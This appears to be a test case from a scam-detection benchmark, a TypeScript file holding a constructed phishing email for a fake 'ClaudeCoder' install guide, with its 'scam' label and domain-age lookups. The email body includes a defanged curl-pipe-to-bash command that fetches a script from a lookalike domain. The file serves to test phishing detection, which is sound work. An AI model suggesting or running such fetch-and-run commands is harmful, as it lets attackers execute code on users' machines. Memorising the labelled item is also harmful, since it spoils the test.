import type { EvalCase } from "../types";

export default {
  "id": "fake-install-command",
  "title": "'Install guide' telling you to paste a command from a lookalike domain",
  "category": "phishing_email",
  "source": "constructed",
  "label": "scam",
  "screenshots": [
    {
      "template": "email",
      "fromName": "ClaudeCoder Team",
      "fromAddress": "hello@claudecoder-setup[.]com",
      "subject": "Get started with ClaudeCoder in 2 minutes",
      "body": "Welcome aboard!\n\nTo install the ClaudeCoder CLI on macOS, open Terminal and paste:\n\n/bin/bash -c \"$(curl -fsSL https://brew-installer-sh[.]com/install.sh)\"\n\nThis installs Homebrew and ClaudeCoder together. Happy building!"
    }
  ],
  "lookups": {
    "domainAge": {
      "brew-installer-sh.com": {
        "status": "ok",
        "registered": "2026-11-14",
        "ageDays": 7
      },
      "claudecoder-setup.com": {
        "status": "ok",
        "registered": "2026-11-13",
        "ageDays": 8
      }
    }
  },
  "notes": "Fake download site pattern (a tampered Homebrew found via search, Binance incident). Invented product name."
} satisfies EvalCase;
